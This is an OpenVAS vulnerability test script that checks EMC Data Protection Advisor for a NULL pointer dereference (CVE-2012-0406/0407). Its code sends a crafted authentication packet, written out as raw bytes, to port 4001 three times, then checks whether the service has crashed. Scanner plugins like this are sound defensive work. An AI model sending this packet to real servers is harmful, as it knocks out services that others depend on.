###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_emc_dpa_dos_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# EMC Data Protection Advisor NULL Pointer Dereference Denial of Service Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802827");
  script_version("$Revision: 4690 $");
  script_cve_id("CVE-2012-0406", "CVE-2012-0407");
  script_bugtraq_id(52833, 53164);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-04-04 14:58:28 +0530 (Wed, 04 Apr 2012)");
  script_name("EMC Data Protection Advisor NULL Pointer Dereference Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(4001);

  script_xref(name:"URL", value:"http://secunia.com/advisories/48658");
  script_xref(name:"URL", value:"http://securitytracker.com/id/1026878");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18688/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/dpa_1-adv.txt");
  script_xref(name:"URL", value:"http://forums.cnet.com/7726-6132_102-5292999.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522408/30/0/threaded");

  tag_impact = "Successful exploitation will allow attackers to cause denial of
  service condition.

  Impact Level: Application";

  tag_affected = "EMC Data Protection Advisor version 5.8.1 Build 5991 and prior";

  tag_insight = "The flaw is due to an NULL pointer dereference error in the DPA
  Controller and Listener service when processing certain authentication
  packets sent to port 3916/TCP and 4001/TCP, which could be exploited by
  remote attackers to crash an affected server.";

  tag_solution = "Vendor has released a patch to fix this issue, please refer below
  link for patch details.
  http://seclists.org/bugtraq/2012/Apr/att-132/ESA-2012-018.txt";

  tag_summary = "This host is running EMC Data Protection Advisor and is prone to
  denial of service vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


## Variable Initialization
req  = "";
res  = "";
req1 = "";
req2 = "";
soc  = 0;
soc2 = 0;
port = 0;

## EMC Data Protection Advisor Listener default port
dpaPort = 4001;

## Check the port status
if(!get_port_state(dpaPort)){
  exit(0);
}

##  Open tcp socket
soc = open_sock_tcp(dpaPort);
if(!soc){
  exit(0);
}

## Construct a request to get a Status Info
req = raw_string(0x34, 0x34, 0x2f, 0x34, 0x34, 0x2f, 0x55, 0x4e, 0x42,
                 0x3c, 0x4c, 0x58, 0x4d, 0x4c, 0x52, 0x45, 0x51, 0x55,
                 0x45, 0x53, 0x54, 0x3e, 0x3c, 0x47, 0x45, 0x54, 0x53,
                 0x54, 0x41, 0x54, 0x55, 0x53, 0x49, 0x4e, 0x46, 0x4f,
                 0x20, 0x2f, 0x3e, 0x3c, 0x2f, 0x4c, 0x58, 0x4d, 0x4c,
                 0x52, 0x45, 0x51, 0x55, 0x45, 0x53, 0x54, 0x3e);

## Sending Request
send(socket:soc, data:req);

## Receive header
res  = recv(socket:soc, length:1024);

## Confirm the application before trying exploit
if("<PRODUCT>DPA</PRODUCT>" >!< res){
  exit(0);
}

## Request to Set the Encryption
req1 = raw_string(0x31, 0x33, 0x35, 0x2f, 0x31, 0x33, 0x35, 0x2f, 0x55,
                  0x4e, 0x42, 0x3c, 0x4c, 0x58, 0x4d, 0x4c, 0x52, 0x45,
                  0x51, 0x55, 0x45, 0x53, 0x54, 0x3e, 0x3c, 0x53, 0x45,
                  0x54, 0x45, 0x4e, 0x43, 0x52, 0x59, 0x50, 0x54, 0x49,
                  0x4f, 0x4e, 0x3e, 0x20, 0x3c, 0x45, 0x4e, 0x43, 0x52,
                  0x59, 0x50, 0x54, 0x49, 0x4f, 0x4e, 0x44, 0x41, 0x54,
                  0x41, 0x3e, 0x20, 0x20, 0x3c, 0x54, 0x59, 0x50, 0x45,
                  0x3e, 0x4e, 0x6f, 0x6e, 0x65, 0x3c, 0x2f, 0x54, 0x59,
                  0x50, 0x45, 0x3e, 0x20, 0x20, 0x3c, 0x44, 0x58, 0x54,
                  0x59, 0x50, 0x45, 0x3e, 0x4e, 0x6f, 0x6e, 0x65, 0x3c,
                  0x2f, 0x44, 0x58, 0x54, 0x59, 0x50, 0x45, 0x3e, 0x20,
                  0x3c, 0x2f, 0x45, 0x4e, 0x43, 0x52, 0x59, 0x50, 0x54,
                  0x49, 0x4f, 0x4e, 0x44, 0x41, 0x54, 0x41, 0x3e, 0x3c,
                  0x2f, 0x53, 0x45, 0x54, 0x45, 0x4e, 0x43, 0x52, 0x59,
                  0x50, 0x54, 0x49, 0x4f, 0x4e, 0x3e, 0x3c, 0x2f, 0x4c,
                  0x58, 0x4d, 0x4c, 0x52, 0x45, 0x51, 0x55, 0x45, 0x53,
                  0x54, 0x3e);


## send the data
send(socket:soc, data:req1);
res  = recv(socket:soc, length:1024);

if(!res)
{
  close(soc);
  exit(0);
}

## Crafted Authentication Packet
req2 = raw_string(0x32, 0x32, 0x34, 0x2f, 0x32, 0x32, 0x34, 0x2f, 0x55,
                  0x4e, 0x42, 0x3c, 0x4c, 0x58, 0x4d, 0x4c, 0x52, 0x45,
                  0x51, 0x55, 0x45, 0x53, 0x54, 0x3e, 0x3c, 0x41, 0x55,
                  0x54, 0x48, 0x45, 0x4e, 0x54, 0x49, 0x43, 0x41, 0x54,
                  0x45, 0x43, 0x4f, 0x4e, 0x4e, 0x45, 0x43, 0x54, 0x49,
                  0x4f, 0x4e, 0x3e, 0x20, 0x3c, 0x41, 0x55, 0x54, 0x48,
                  0x45, 0x4e, 0x54, 0x49, 0x43, 0x41, 0x54, 0x49, 0x4f,
                  0x4e, 0x44, 0x41, 0x54, 0x41, 0x3e, 0x20, 0x20, 0x3c,
                  0x41, 0x55, 0x54, 0x48, 0x4c, 0x45, 0x56, 0x45, 0x4c,
                  0x3e, 0x46, 0x75, 0x6c, 0x6c, 0x3c, 0x2f, 0x41, 0x55,
                  0x54, 0x48, 0x4c, 0x45, 0x56, 0x45, 0x4c, 0x3e, 0x20,
                  0x20, 0x3c, 0x55, 0x53, 0x45, 0x52, 0x4e, 0x41, 0x4d,
                  0x45, 0x3e, 0x77, 0x79, 0x73, 0x64, 0x6d, 0x5f, 0x70,
                  0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x5f, 0x75, 0x73,
                  0x65, 0x72, 0x3c, 0x2f, 0x55, 0x53, 0x45, 0x52, 0x4e,
                  0x41, 0x4d, 0x45, 0x3e, 0x20, 0x20, 0x3c, 0x43, 0x4c,
                  0x49, 0x45, 0x4e, 0x54, 0x49, 0x44, 0x3e, 0x67, 0x75,
                  0x69, 0x3a, 0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d,
                  0x65, 0x3c, 0x2f, 0x43, 0x4c, 0x49, 0x45, 0x4e, 0x54,
                  0x49, 0x44, 0x3e, 0x20, 0x3c, 0x2f, 0x41, 0x55, 0x54,
                  0x48, 0x45, 0x4e, 0x54, 0x49, 0x43, 0x41, 0x54, 0x49,
                  0x4f, 0x4e, 0x44, 0x41, 0x54, 0x41, 0x3e, 0x3c, 0x2f,
                  0x41, 0x55, 0x54, 0x48, 0x45, 0x4e, 0x54, 0x49, 0x43,
                  0x41, 0x54, 0x45, 0x43, 0x4f, 0x4e, 0x4e, 0x45, 0x43,
                  0x54, 0x49, 0x4f, 0x4e, 0x3e, 0x3c, 0x2f, 0x4c, 0x58,
                  0x4d, 0x4c, 0x52, 0x45, 0x51, 0x55, 0x45, 0x53, 0x54,
                  0x3e);

## send the the exploit multiple times
for(i=0; i < 3; i++)
{
  send(socket:soc, data:req2);
  sleep(3);

  ## Confirm if DPA is a crashed
  soc2 = open_sock_tcp(dpaPort);
  if(!soc2)
  {
    security_message(dpaPort);
    close(soc);
    exit(0);
  }
  close(soc2);
}
close(soc);
